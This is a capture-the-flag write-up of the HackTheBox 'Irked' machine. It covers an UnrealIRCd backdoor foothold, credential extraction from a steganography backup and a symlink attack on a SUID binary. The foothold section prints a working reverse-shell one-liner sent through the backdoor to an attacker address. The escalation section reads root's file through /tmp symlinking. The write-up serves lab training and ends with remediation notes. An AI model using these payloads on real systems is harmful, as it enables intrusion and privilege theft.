HTB Irked: UnrealIRCd backdoor and a SUID reader to root

retired-machineeasy

Irked is a retired HackTheBox easy Linux machine whose name tells the story. Synopsis: an UnrealIRCd 3.2.8.1 backdoor (CVE-2010-2075) for foothold, a stego backup for lateral movement, and a SUID viewuser binary that reads the flag for you.

$ Enumeration — version the IRC daemon

# nmap: spot UnrealIRCd 3.2.8.1
nmap -sC -sV -oN irked.nmap 10.10.10.117

UnrealIRCd 3.2.8.1 on the IRC port — a version famous for a planted backdoor that executes any AB;-prefixed message as a shell command. Service version plus one search equals foothold.

$ Foothold — IRC backdoor

# bash: raw-protocol backdoor trigger
nc 10.10.10.117 6697
NICK pwn
USER pwn 0 * :pwn
AB; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.23 4444 >/tmp/f

Complete a minimal handshake, send AB; plus a reverse-shell one-liner — the daemon executes it and calls back as the low-privilege ircd user. Skip the chat: the backdoor triggers on raw protocol input, so script the handshake.

$ Lateral move — stego backup

# bash: steghide the backup image
ls ~/backup/   # backup image plus hint text
steghide extract -sf backup.jpg   # passphrase from the hint -> djmarduk credential
su djmarduk

Home directories hold a user plus a steganography-flavored backup file — extract it for the djmarduk credential and step up to a fuller shell. Backups and images on easy boxes are credential storage until proven otherwise.

$ Privilege escalation — SUID viewuser

# bash: symlink the flag into view
ls -l /usr/bin/viewuser   # SUID root, reads /tmp/listusers
ln -sf /root/root.txt /tmp/listusers
/usr/bin/viewuser   # prints the flag
# same primitive plus shell upgrade path -> full root

A custom SUID-root binary displays a user list file from /tmp — and follows symlinks without checking. Point it at the flag and it prints it for you. Flag values redacted per HTB rules; earn them in your own lab.

$ Dead ends

Social IRC interaction (script the raw handshake) and ignoring the stego file as decoration.

$ Remediation notes

Never run known-backdoored software, strip SUID from file-touching custom binaries, and treat unknown SUID programs as suspicious. Written by Lucky Thandel.
